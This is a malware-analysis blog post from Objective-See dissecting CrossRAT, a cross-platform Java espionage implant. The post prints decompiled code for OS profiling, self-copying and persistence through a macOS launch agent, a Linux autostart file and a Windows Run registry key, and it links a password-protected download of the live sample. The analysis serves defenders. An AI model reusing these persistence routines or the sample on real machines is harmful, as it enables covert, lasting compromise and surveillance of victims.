<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">

<head>
<title>Objective-See</title>

<link rel="shortcut icon" href="../images/logoApple.ico">
<link rel="stylesheet" type="text/css" href="../css/style.css">
<link href="../css/ss-social.css" rel="stylesheet" />
<link href="../css/ss-standard.css" rel="stylesheet" />
<link href="../css/timeline.css" rel="stylesheet" />
<link href="../css/table.css" rel="stylesheet" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:title" content="Analyzing CrossRAT" />
<meta name="twitter:description" content="A cross-platform implant, utilized in a global cyber-espionage campaign" />
<meta name="twitter:image" content="https://objective-see.com/images/blog/blog_0x28/blockblock.png" />

<meta property="og:title" content="Analyzing CrossRAT" />
<meta property="og:type" content="website" />
<meta property="og:image" content="https://objective-see.com/images/blog/blog_0x28/blockblock.png" />


<script src="../js/analytics.js"></script>
<script src="../js/sweetalert.min.js"></script> 
<script src="../js/donationPopup.js"></script> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>

<script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
<script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<link href="https://objective-see.com/rss.xml" rel="alternate" type="application/rss+xml" title="Objective-See's Blog Feed" />

<meta http-equiv="Cache-Control" content="no-store" />

</head>

<body>
<nav role="main">
<ul>
	<li><a href="../index.html" class="menubutton logo">Objective See</a></li>
	<li><a href="../about.html" class="menubutton about">about</a></li>
	<li><a href="../blog.html" class="menubutton blog visited">blog</a></li>
	<li><a href="../malware.html" class="menubutton malware">malware</a></li>
	<li><a href="../products.html" class="menubutton products">products</a></li>
</ul>
</nav>

<div class="pageContent">
	<hr class="gradient">
	<br>
	<section class="blogContent">
		<div class="blogTitle">Analyzing CrossRAT</div>
		<div class="blogSubTitle">&rsaquo; a cross-platform implant, utilized in a global cyber-espionage campaign</div>
		<div class="blogDate">1/24/2018</div>
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
		<span class="n3rdFont">
		love these blog posts? support my tools &amp; writing on <a class="inlineLink" href="https://www.patreon.com/objective_see"><span class="n3rdFont">patreon</span></a> :)
		<br><br>
		<span>
		<a class="inlineLink" href="https://www.patreon.com/objective_see">
			<img src="../patreon/images/patreon.jpg" width="700" style="display:block; margin:auto;"/>
		</a>
		</span>
		<br>
		</span>
		</div>
		<br>
    <div style="border: 1px solid red; padding: 10px; margin-top:15px;">
    Want to play along? I've shared the malware, which can be downloaded <a class="inlineLink" href="https://objective-see.com/downloads/malware/CrossRAT.zip">here</a> (password: <span class="n3rdFont">infect3d</span>).
    </div>

		<br>
		<span style="color: #95c02d; font-weight: bold;">Background</span><br>
		I'm on a plane <i>again</i>...this time flying home from one of my favorite hacker cons: <a class="inlineLink" href="http://shmoocon.org/">ShmooCon</a>! I was stoked to give a talk about auditing on macOS. Yah, I know that doesn't seem like the sexiest of topics -but if you're interested in incidence response, malware analysis, or writing security tools for macOS, it's a very relevant topic! Plus, the talk covered some neat ring-0 bugs that affected the audit subsystem including a kernel panic, a kernel information leak, and a exploitable kernel heap overflow: 
    <br><br>
      <span><img src="../images/blog/blog_0x27/shmoo.png" width="800" style="display:block; margin:auto;"/></span>
    <br>
    Besides being able to speak, the highlight of ShmooCon was meeting tons of new awesome people - some who are in a way directly responsible for this blog. I personally have to thank Kate from Gizmodo (<a class="inlineLink" href="https://twitter.com/kateconger">@kateconger</a>), who introduced me to Eva (<a class="inlineLink" href="https://twitter.com/evacide">@evacide</a>) and Cooper (<a class="inlineLink" href="https://twitter.com/cooperq">@cooperq</a>) from the <a class="inlineLink" href="https://www.eff.org/"> Electronic Frontier Foundation (EFF). </a> We geeked out about a variety of stuff, including their latest reported (produced in conjunction with <a class="inlineLink" href="https://www.lookout.com/">Lookout)</a>: <i><a class="inlineLink" href="https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf">"Dark Caracal Cyber-espionage at a Global Scale"</a></i>. Their findings about this global nationstate cyber-espionage campaign are rather ominous. From their report:

    <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">

    <ul style="list-style-type:square">
    <li>Dark Caracal has been conducting a multi-platform, APT-level surveillance operation targeting individuals and institutions globally.
    </li><br>

    <li>We have identified hundreds of gigabytes of data exfiltrated from
thousands of victims, spanning 21+ countries in North America,
Europe, the Middle East, and Asia. 
    </li><br>

    <li>The mobile component of this APT is one of the first we've seen
executing espionage on a global scale.
    </li><br>

    <li>Dark Caracal targets also include governments, militaries,
utilities, financial institutions, manufacturing companies, and
defense contractors.
    </li><br>

    <li>Types of exfiltrated data include documents, call records, audio
recordings, secure messaging client content, contact information,
text messages, photos, and account data. 
    </li><br>

    <li>Dark Caracal follows the typical attack chain for cyber-espionage.
They rely primarily on social media, phishing, and in some cases
physical access to compromise target systems, devices, and accounts.
    </li><br>


      <li>
        Dark Caracal makes extensive use of Windows malware called
Bandook RAT. Dark Caracal also uses a previously unknown, multiplatform
tool that Lookout and EFF have named CrossRAT, which is
able to target Windows, OSX, and Linux.
      </li>
    </ul>
  </span>
  </div>
  <br>
  The report is an intriguing read and quite thorough. Seriously, go <a class="inlineLink" href="https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf">read it</a>!  I was most interested in <span class="n3rdFont">"CrossRAT"</span>, a "multiplatform tool...able to target Windows, OSX, and Linux", which the report did discuss, but not in a ton of technical detail. I'm not complaining at all - gave me something interesting to poke on and blog about!
  <br>
  <br>
  In this blog post we'll analyze this threat, providing a comprehensive technical overview that includes its persistence mechanisms as well as its capabilities. I want to thank Cooper (<a class="inlineLink" href="https://twitter.com/cooperq">@cooperq</a>) for sharing not only a sample of <span class="n3rdFont">CrossRAT</span>, but also his analysis notes - especially related to the C&amp;C protocol. Mahalo dude!!
  <br>
  <br>
  <span style="color: #95c02d; font-weight: bold;">CrossRAT</span><br>
  The EFF/Lookout <a class="inlineLink" href="https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf">report</a> describes <span class="n3rdFont">CrossRat</span> as a "<i>newly discovered desktop surveillanceware tool...which is able to target Windows, OSX, and Linux.</i>" Of course the OSX (macOS) part intrigues me the most, so this post may have somewhat of a 'Mac-slant.'
  <br>
  <br>
  The report provides a good overview of this new threat:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <i>"Written in Java with the ability to target Windows, Linux, and OSX, CrossRAT is able to manipulate the file system, take screenshots, run arbitrary DLLs for secondary infection on Windows, and gain persistence on the infected system."</i> 
  </div>  
  <br>
  A sample, <span class="n3rdFont">'hmar6.jar'</span> was submitted to VirusTotal (view <a class="inlineLink" href="https://www.virustotal.com/#/file/15af5bbf3c8d5e5db41fd7c3d722e8b247b40f2da747d5c334f7fd80b715a649/detection">here</a>). Somewhat unsurprisingly (as is often the case with new malware), it's detection even now is basically none-existent: 1/59
  <br><br>
      <span><img src="../images/blog/blog_0x28/detection.png" width="800" style="display:block; margin:auto;"/></span>
  <br>
  Though I'm not fond of Java as a programming language, it is "decompilable" - meaning malware written in this language is fairly straightforward to analyze. Tools such as <a class="inlineLink" href="https://en.wikipedia.org/wiki/JAD_(software)">jad</a> or <a class="inlineLink" href="http://jd.benow.ca/">"JD-GUI"</a> can take as input a compiled jar file, and spit out decently readable Java code! And since it's 2018 you can even decompile Java <a class="inlineLink" href="http://www.javadecompilers.com/">in the cloud</a>! Now if only somebody could combine this with the blockchain...
  <br>
  <br>
  Opening the malicious <span class="n3rdFont">.jar</span> file <span class="n3rdFont">'hmar6.jar'</span>, in JD-GUI reveals the following package layout: 
  <br><br>
      <span><img src="../images/blog/blog_0x28/package.png" width="800" style="display:block; margin:auto;"/></span>
  <br>
  As a <span class="n3rdFont">.jar</span> is an archive, one could also just unzip it, then browser the package structure manually. Of course the files in the archive are Java classes containing Java bytecode. Thus one of the aforementioned Java decompilers should be used.
  <br>
  <br>
  For the purpose of this blog post, our goals are to identify and understand the malware's:
  <ul style="list-style-type:square">
   <li>persistence mechanism (and install location)</li><br>
   <li>C&amp;C communications</li><br>
   <li>features/capabilities</li><br>
  </ul>
  We'll ultimately discuss the <span class="n3rdFont">client.class</span> file in the <span class="n3rdFont">crossrat</span> package, as it contains both the main entry point of the malware (<span class="n3rdFont">public static void main(String args[])</span>), and it's main logic. However, let's first start by peaking at the other packages in the jar; <span class="n3rdFont">'a'</span>, <span class="n3rdFont">'b'</span>, and <span class="n3rdFont">'org'</span>.
  <br>
  <br>
  The first package, (which JD-GUI simply names <span class="n3rdFont">'a'</span>), appears to be responsible for determining the OS version of any system it is running on. Since Java can run on multiple platforms, <span class="n3rdFont">CrossRAT</span> can be deployed on Windows, Linux, SunOS, and OS X (well, assuming Java is installed). Of course not all the logic in the implant can be OS-agnostic. For example, persistence (as we'll see) is OS-specific. As such correctly identifying the underlying system is imperative. It's also likely this information is useful to the attackers (i.e. for profiling, metrics, etc).
  <br>
  <br>
  Dumping strings of the <span class="n3rdFont">a/c.class</span> shows the supported systems that <span class="n3rdFont">CrossRAT</span> should run on:
  <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  $ strings - CrossRAT/a/c.class
    LINUX
    MACOS
    SOLARIS
    WINDOWS</pre>
  </span> 
  </div>
  <br>
  Java provides various OS-agnostic methods to detect the type of operating system its running on. For example, <span class="n3rdFont">CrossRAT</span> invoke the following:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 15px;">
  <span class="n3rdFont">
  <pre>
  System.getProperty("os.name")</pre>
  </span>
  </div>
  <br>
  This method will return values such as <span class="n3rdFont">"windows"</span>, <span class="n3rdFont">"linux"</span>, or <span class="n3rdFont">"mac os"</span>.
  <br>
  <br>
  Interestingly the implant also contains various OS-specific code that aids in the more precise OS detection (yes, rather meta). For example code within the <span class="n3rdFont">a/c/a.class</span> executes <span class="n3rdFont">/usr/bin/sw_vers</span>: 

  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
   Object localObject = new File(<b>"/usr/bin/sw_vers"</b>);
   ...

   Iterator localIterator = (localObject = e.a((File)localObject)).iterator();
   while (localIterator.hasNext()) {
      if ((localObject = (String)localIterator.next()).contains(c.b.a())) {
          return true;
      }
   }
   
   if (paramBoolean) {
      return ((localObject = System.getProperty("os.name").toLowerCase()).contains(<b>"mac os x"</b>)) 
             || (((String)localObject).contains(<b>"macos"</b>));
   }
   ...</pre>
  </span>
  </div>
  <br>
  The <span class="n3rdFont">sw_vers</span> binary is Apple-specific, and returns the exact version of OSX/macOS. On my box:
  <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  $ /usr/bin/sw_vers
    ProductName:  Mac OS X
    ProductVersion: 10.13.2
    BuildVersion: 17C88</pre></span>
  </div>
  <br>
  <span class="n3rdFont">CrossRAT</span> also contains other non-OS agnostic code to determine or gather information about an infected system. For example, in the <span class="n3rdFont">crossrat/e.class</span> file, we see a call to <span class="n3rdFont">uname</span> (with the <span class="n3rdFont">-a</span> flag):
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
  public static String c()
  {
        String s = null;
        Object obj = Runtime.getRuntime().exec(new String[] {<b>"uname", "-a"</b>});
        s = ((BufferedReader) (obj = new BufferedReader(new InputStreamReader(((Process)
             (obj)).getInputStream())))).readLine();
        ((BufferedReader) (obj)).close();
        
        return s;
  }</pre>
  </span>
  </div>
  <br>
  The <span class="n3rdFont">uname</span> command, when executed with the <span class="n3rdFont">-a</span> flag will display not only OS version, but also information that identifies the kernel build and architecture (i.e. <span class="n3rdFont">x86_64</span>):
  <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  $ uname -a
    Darwin Patricks-MacBook-Pro.local 17.3.0 Darwin Kernel Version 17.3.0: 
    root:xnu-4570.31.3~1/RELEASE_X86_64 x86_64</pre>
  </span>
  </div>
  <br>
  Finally the implant even attempts to query <span class="n3rdFont">systemd</span> files for (recent/modern) linux-specific version information:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>
  try
  {
      obj1 = a(new File("/etc/os-release"), "=");
  }
  catch(Exception _ex)
  {
      System.out.println("Failed to load /etc/os-release");
  }
  try
  {
      map = a(new File("/etc/lsb-release"), "=");
  }
  catch(Exception _ex)
  {
      System.out.println("Failed to load /etc/lsb-release");
  }
  </pre>
  </span>
  </div>
  <br>
  Finally, though absent in the disassembly, running the <span class="n3rdFont">strings</span> command reveals a large list of OS versions that <span class="n3rdFont">CrossRAT</span> apparently is able to detect (and infect?). Here for example, a myriad of linux versions:
  <div style="padding: 20px; margin-top:10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont">
    $ strings - a/b/c.class
    <br><br>

    Alpine Linux Antergos Arch Linux Blag Centos Chakra Chapeau Crunchbang Crux Centos Chakra Chapeau Crunchbang Crux Debian Deepin Dragora Debian Debian Kali Linux Deepin Dragora Elementary_os Evolve_os Evolve Os Evolveos Fedora Frugalware Funtoo Fedora Frugalware Funtoo Gentoo Gnewsense Gentoo Jiyuu Jiyuu Kali Kaos Kde Neon Kde_neon Korora Kaos Kali Kali Linux Korora Lmde Lunar La/b/c; Linux Mint Linuxdeepin Linuxmint Lunar Lunar Linux Mageia Mandrake Mandriva Manjaro Mint Mageia Mandrake Mandriva Mandriva Linux Manjaro Manjaro Linux Nixos Nixos Opensuse Oracle_linux Oracle Linux Parabola Peppermint Parabola Parabola Gnu/linux-libre Peppermint Qubes Qubes Raspbian Redhat_enterprise Raspbian Red Hat Redhatenterprise Redhat Enterprise Sabayon Scientificlinux Slackware Solusos Steamos Suse Linux Sabayon Scientific Linux Slackware Solusos Stackmaptable Steamos Tinycore Trisquel Ubuntu Unknown Ubuntu Unknown Unknown Linux Viperr 
  
  </div>
  </span>
  <br>
  Moving on, let's take a peak at the next package, which JD-GUI simply names <span class="n3rdFont">'b'</span>:
  <br><br>
      <span><img src="../images/blog/blog_0x28/packageB.png" width="800" style="display:block; margin:auto;"/></span>
  <br>
  Wonder what this package is responsible for? If you guessed 'persistence' you'd be correct :)
  <br>
  <br>
  On an infected system, in order to ensure that the OS automatically (re)executes the malware whenever the system is rebooted, the malware must persist itself. This (generally) requires OS-specific code. That is to say, there are Windows-specific methods of persistence, Mac-specific method, Linux-specific methods, etc...
  <br>
  <br> 
  The <span class="n3rdFont">b/c.class</span> implements macOS-specific persistence by means of a <span class="n3rdFont">Launch Agent</span>. First the <span class="n3rdFont">'a'</span> method invokes the <span class="n3rdFont">'b'</span> method:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>
  public final void a()
  {
      if(!b().exists())
            b().mkdirs(); 

      ...</pre>
  </span>
  </div>
  <br>
  Looking at the <span class="n3rdFont">'b'</span> method, we can see it returns a launch agent directory. If the user is root, it will return the directory for system launch agents (i.e. <span class="n3rdFont">/Library/LaunchAgents/</span>) otherwise the user-specific directory will be returned (e.g. <span class="n3rdFont">/Users/patrick/Library/LaunchAgents/</span>).

  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
  private static File b()
  {
        String s = System.getProperty("user.home");
        if(a.c.b().a() != a.c.a &amp;&amp; (new BufferedReader(new InputStreamReader(
        Runtime.getRuntime().exec("whoami").getInputStream()))).readLine().equals("root"))
        {
            s = "";
        }
        return new File((new StringBuilder(String.valueOf(s))).append("/Library/LaunchAgents/")
                        .toString());
  }
  </pre>
  </span>
  </div>
  <br>
  The code then creates a launch agent property list (plist):
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>
  ((PrintWriter) (obj = new PrintWriter(new FileWriter(((File) (obj))))))
                 .println(&quot;&lt;plist version=\&quot;1.0\&quot;&gt;&quot;);
  ((PrintWriter) (obj)).println(&quot;&lt;dict&gt;&quot;);
  ((PrintWriter) (obj)).println(&quot;\t&lt;key&gt;Label&lt;/key&gt;&quot;);
  ((PrintWriter) (obj)).println((new StringBuilder(&quot;\t&lt;string&gt;&quot;))
                 .append(super.b).append(&quot;&lt;/string&gt;&quot;).toString());
  ((PrintWriter) (obj)).println(&quot;\t&lt;key&gt;<b>ProgramArguments</b>&lt;/key&gt;&quot;);
  ((PrintWriter) (obj)).println(&quot;\t&lt;array&gt;&quot;);
  if(a)
  {
      ((PrintWriter) (obj)).println(&quot;\t\t&lt;string&gt;<b>java</b>&lt;/string&gt;&quot;);
      ((PrintWriter) (obj)).println(&quot;\t\t&lt;string&gt;<b>-jar</b>&lt;/string&gt;&quot;);
  }
  ((PrintWriter) (obj)).println((new StringBuilder(&quot;\t\t&lt;string&gt;&quot;))
                 .append(<b>super.c</b>).append(&quot;&lt;/string&gt;&quot;).toString());
  ((PrintWriter) (obj)).println(&quot;\t&lt;/array&gt;&quot;);
  ((PrintWriter) (obj)).println(&quot;\t&lt;key&gt;<b>RunAtLoad</b>&lt;/key&gt;&quot;);
  ((PrintWriter) (obj)).println(&quot;\t<b>&lt;true/&gt;</b>&quot;);
  ((PrintWriter) (obj)).println(&quot;&lt;/dict&gt;&quot;);
  ((PrintWriter) (obj)).println(&quot;&lt;/plist&gt;&quot;);
  ((PrintWriter) (obj)).close();</pre>
  </span>
  </div>
  <br>
  As the <span class="n3rdFont">RunAtLoad</span> key is set to <span class="n3rdFont">true</span>, whatever the malware has specified in the <span class="n3rdFont">ProgramArguments</span> array will be executed. From the code we can see this is: <span class="n3rdFont">java -jar [super.c]</span>. To determine what <span class="n3rdFont">.jar</span> is persisted (i.e. <span class="n3rdFont">super.c</span>) we could analyze the decompiled java code...or it's simpler to just run the malware, then dump the plist file. We opt for the latter and infect a Mac VM:
  <div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  $ java -jar hmar6.jar &amp;
 
  $ cat ~/Library/LaunchAgents/mediamgrs.plist 
    &lt;plist version=&quot;1.0&quot;&gt;
    &lt;dict&gt;
      &lt;key&gt;Label&lt;/key&gt;
      &lt;string&gt;mediamgrs&lt;/string&gt;
      &lt;key&gt;ProgramArguments&lt;/key&gt;
      &lt;array&gt;
        &lt;string&gt;java&lt;/string&gt;
        &lt;string&gt;-jar&lt;/string&gt;
        &lt;string&gt;<b>/Users/user/Library/mediamgrs.jar</b>&lt;/string&gt;
      &lt;/array&gt;
      &lt;key&gt;RunAtLoad&lt;/key&gt;
      &lt;true/&gt;
    &lt;/dict&gt;
    &lt;/plist&gt;</pre>
  </span>
</div>
<br>
Ah, so <span class="n3rdFont"> ~/Library/mediamgrs.jar</span> is persisted. If we hash this file with the malicious <span class="n3rdFont">'hmar6.jar'</span> that we've been analyzing they match. In other words the malware simply persists itself:
<div style="padding: 5px; margin-top:10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  $ md5 ~/Library/mediamgrs.jar
  MD5 (/Users/user/Library/mediamgrs.jar) = <b>85b794e080d83a91e904b97769e1e770</b>
  
  $ md5 hmar6.jar 
  MD5 (/Users/user/Desktop/hmar6.jar) = <b>85b794e080d83a91e904b97769e1e770</b>
  </pre>
  </span>
  </div>
  <br>
  Moving on, we can figure out how the malware persists both on Linux and Windows.
  <br><br>
  Linux persistence is implemented in the <span class="n3rdFont">b/d.class</span>:
  <br><br>
      <span><img src="../images/blog/blog_0x28/linuxPersist.png" width="800" style="display:block; margin:auto;"/></span>
  <br>
  As can be seen in the above screen capture, <span class="n3rdFont">CrossRAT</span>, the malware persists on Linux by creating an autostart file in the aptly named <span class="n3rdFont">~/.config/autostart/</span> directory (file: <span class="n3rdFont">mediamgrs.desktop</span>). Similar to macOS, it persists itself: <span class="n3rdFont">Exec=java -jar [this.c]</span> Looking elsewhere in the code, we can see the value for <span class="n3rdFont">'this.c'</span> will be set to: <span class="n3rdFont">/usr/var/mediamgrs.jar</span> at runtime:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>  else
  {
      k.K = "/usr/var/";
  }
  
  paramArrayOfString = new File(k.K + "mediamgrs.jar");</pre>
  </span>
  </div>
  <br>
  For more information on persisting a file on Linux using this 'autostart' technique, see: <a class="inlineLink" href="https://neverbenever.wordpress.com/2015/02/11/how-to-autostart-a-program-in-raspberry-pi-or-linux/">"How To Autostart A Program In Raspberry Pi Or Linux?"</a>.
  <br>
  <br>
  Of course <span class="n3rdFont">CrossRAT</span> also contains logic to persist on Windows machines. This persistence code can be found in the <span class="n3rdFont">b/e.class</span>:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>  public final void a()
  {
      String s;
      if(a)
      {
          s = (new StringBuilder(String.valueOf(System.getProperty("java.home"))))
          .append("\\bin\\javaw.exe").toString();

          s = (new StringBuilder(String.valueOf(s))).append(" -jar \"")
          .append(c).append("\"").toString();
      } else
      {
          s = super.c;
      }
      Runtime.getRuntime().exec(new String[] {
          "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 
                        "/v", super.b, "/t", "REG_SZ", "/d", s, "/f"
      });
  }</pre>
  </span>
  </div>
  <br>
  Ah the good old <span class="n3rdFont">CurrentVersion\Run</span> registry key. A rather lame Windows persistence technique, but hey, it will persist the malware's .jar file ensuring it's (re)executed each time an infected system is rebooted.
  <br><br>
  With a decent understanding of both the <span class="n3rdFont">'a'</span> package (OS detection) and the <span class="n3rdFont">'b'</span> package (persistence), let's discuss the <span class="n3rdFont">'org'</span> package. Then, finally(!), we'll dive into the malware's core logic.
  <br><br>
      <span><img src="../images/blog/blog_0x28/packageOrg.png" width="800" style="display:block; margin:auto;"/></span>
  <br>
  The <span class="n3rdFont">'org'</span> package contains packages named<span class="n3rdFont">'a.a.a.'</span> and <span class="n3rdFont">'jnativehook'</span>.
  <br>
  <br>
  Looking at various classes within the <span class="n3rdFont">'a.a.a'</span> package, we can see this package contains code dealing with file i/o operations. For example take a look at some of the strings from the <span class="n3rdFont">'a.a.a/b.class'</span>:
  <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  $ strings - strings - src/org/a/a/a/b.class
  does not exist
  is not a directory
  to a subdirectory of itself  
  already exists
  cannot be written to
  directory cannot be created
  does not exist
  exists but is a directory
  exists but is read-only
  Cannot move directory: 
  Destination must not be null
  Failed to copy full contents from
  Failed to delete original directory
  Failed to list contents of 
  File does not exist: 
  Unable to delete file:</pre>
  </span> 
  </div>
  <br>
  Pretty clear that this is the part of the implant that allows a remote attacker the ability to interact with and modify the file system on an infected system.
  <br>
  <br>
  Want to confirm this in code? Let's take a look at the <span class="n3rdFont">'a'</span> method in the same <span class="n3rdFont">'a.a.a/b.class'</span>. This method will copy a file, taking in an optional parameter to 'match' the file modification of the destination file to its source. Hey, that'd pretty neat!

  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>

  private static void a(File paramFile1, File paramFile2, boolean paramBoolean)
  {
    if ((paramFile2.exists()) &amp;&amp; (paramFile2.isDirectory())) {
      throw new IOException("Destination '" + paramFile2 + "' exists but is a directory");
    }
    ....
    try
    {
      localFileInputStream = new FileInputStream(paramFile1);
      localFileOutputStream = new FileOutputStream(paramFile2);
      localFileChannel1 = localFileInputStream.getChannel();
      localFileChannel2 = localFileOutputStream.getChannel();
      l1 = localFileChannel1.size();
      long l5;
      for (l2 = 0L; l2 < l1; l2 += l5)
      {
        long l4;
        long l3 = (l4 = l1 - l2) > 31457280L ? 31457280L : l4;
        if ((l5 = localFileChannel2.transferFrom(localFileChannel1, l2, l3)) == 0L) {
          break;
        }
      }
      ...
    }

    ....

    long l1 = paramFile1.length();
    long l2 = paramFile2.length();
    if (l1 != l2) {
      throw new IOException("<b>Failed to copy full contents from</b> '" + paramFile1 + "' to '" + 
                              paramFile2 + "' Expected length: " + l1 + " Actual: " + l2);
    }
    if(paramBoolean) {
      paramFile2.<b>setLastModified</b>(paramFile1.lastModified());
    }
  }</pre>
</span>
</div>
<br>
The other package in the <span class="n3rdFont">'org'</span> package is named <span class="n3rdFont">'jnativehook'</span>. If you google this, you'll discover its an open-source Java library. Check out its github page: <a class="inlineLink" href="https://github.com/kwhat/jnativehook">jnativehook</a>. 
<br>
<br>
As described by its author, it was created to "<i>provide global keyboard and mouse listeners for Java</i>". This functionality is not possible in (high-level) Java code, thus the library leverages "<i>platform dependent native code...to create low-level system-wide hooks and deliver those events to your application.</i>" Hrmm why would a cyber-espionage implant be interested in such capabilities? Capturing key-events (i.e. keylogging) would be an obvious answer! However, I didn't see any code within that implant that referenced the <span class="n3rdFont">'jnativehook'</span> package - so at this point it appears that this functionality is not leveraged? There may be a good explanation for this. As noted in the report, the malware identifies it's version as 0.1, perhaps indicating it's still a work in progress and thus not feature complete.
<br>
<br>
Ok, time to dive into the core logic of <span class="n3rdFont">CrossRat</span>!
<br>
<br>
The main logic of the malware is implemented within the <span class="n3rdFont">crossrat/client.class</span> file. In fact this class contains the main entry point of the implant (<span class="n3rdFont">public static void main(String args[])</span>):
 <div style="padding: 20px; background-color:black; color:lime; font-size: 15px;">
<span class="n3rdFont"><pre>
  grep -R main hmar6.jar/*

  crossrat/client.jad:    public static void <b>main</b>(String args[])</pre>
</span>
</div>
<br>
When the malware is executed this <span class="n3rdFont">main</span> method is invoked. This performs the following steps:
<ol>
<li>If necessary, performs an OS-specific persistent install</li><br>
<li>Checks in with the remote command and control (C&amp;C) server</li><br>
<li>Performs any tasking as specified by the C&amp;C server</li>
</ol>
Let's take a closer look at all of this!
<br>
<br>
The malware first installs itself persistently. As previously discussed, this logic is OS-specific and involves the malware copying itself to a persistent location (as <span class="n3rdFont">mediamgrs.jar</span>), before setting persistence (registry key, launch agent plist, etc). I've inserted comments into the following code, to illustrate these exact steps. Below, we first have the code the builds the path to the OS-specific install directory:
<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
  <span class="n3rdFont">
  <pre>  public static void main(String args[])
  {
      Object obj;
      supportedSystems = c.b();

      String tempDirectory;

      <span style="color: #006600;">//get temp directory</span>
      s = System.getProperty(s = "java.io.tmpdir");
      
      installDir = "";

      <span style="color: #006600;">//Windows?
      // build path to Windows install directory (temp directory)</span>
      if(supportedSystems.a() == c.a)
      {
          installDir = (new StringBuilder(String.valueOf(s)))
                        .append("\\").toString();
      }

      <span style="color: #006600;">//Mac?
      // build path to Mac install directory (~/Library)</span>
      else if(supportedSystems.a() == c.b)
      {
          userHome = System.getProperty("user.home");
          installDir = (new StringBuilder(String.valueOf(userHome)))
                        .append("/Library/").toString();
      } 

      <span style="color: #006600;">//Linux, etc?
      // build path to Linux, etc install directory (/usr/var/)</span>
      else
      {
          installDir = "/usr/var/";
      }

      ...</pre>
</span>
</div>
<br>
Once path to the install directory has been dynamically created, the malware makes a copy of itself (<span class="n3rdFont">mediamgrs.jar</span>) into the install directory:
<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size:15px;">
<span class="n3rdFont">
<pre>  public static void main(String args[])
  {
    ...

    <span style="color: #006600;">//build full path and instantiate file obj</span>
    installFileObj = new File(installDir + "mediamgrs.jar");

    <span style="color: #006600;">//copy self to persistent location</span>
    org.a.a.a.b.a(((File) (selfAsFile)), installFileObj);

    ...</pre>
</span>
</div>
<br>
Via the <span class="n3rdFont">fs_usage</span> command, we can observe this file copy, and updating of the file time to match to original:

<div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont">
  <pre>
  # fs_usage -w -f filesystem
  open       F=7    (R_____)  /Users/user/Desktop/hmar6.jar  java.125131
  lseek      F=7    O=0x00000000 <SEEK_CUR> java.125131
  
  open       F=8    (_WC_T_)  /Users/user/Library/mediamgrs.jar java.125131
  pwrite     F=8    B=0x3654f   O=0x00000000  java.125131
  close      F=8    0.000138  java.125131
  utimes     /Users/user/Library/mediamgrs.jar java.125131

  # ls -lart /Users/user/Library/mediamgrs.jar
  -rw-r--r--  1 user  staff  222543 <b>Jan 22 18:54</b> /Users/user/Library/mediamgrs.jar
  # ls -lart ~/Desktop/hmar6.jar 
  -rw-r--r--  1 user  wheel  222543 <b>Jan 22 18:54</b> /Users/user/Desktop/hmar6.jar</pre>
  </span> 
  </div>
  <br>
  Once the malware has made a copy of itself, it execute the OS-specific logic to persist. As we're executing the malware on a Mac VM, the malware will persist as a launch agent:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
  <span class="n3rdFont">
  <pre>  public static void main(String args[])
  {
    ...
    <span style="color: #006600;">//persist: Windows</span>
    if ((localObject5 = a.c.b()).a() == a.c.a) {
      paramArrayOfString = new b.e(paramArrayOfString, (String)localObject4, true);
    } 

    <span style="color: #006600;">//persist: Mac</span>
    else if (((a.a)localObject5).a() == a.c.b) {
      paramArrayOfString = new b.c(paramArrayOfString, (String)localObject4, true);
    } 

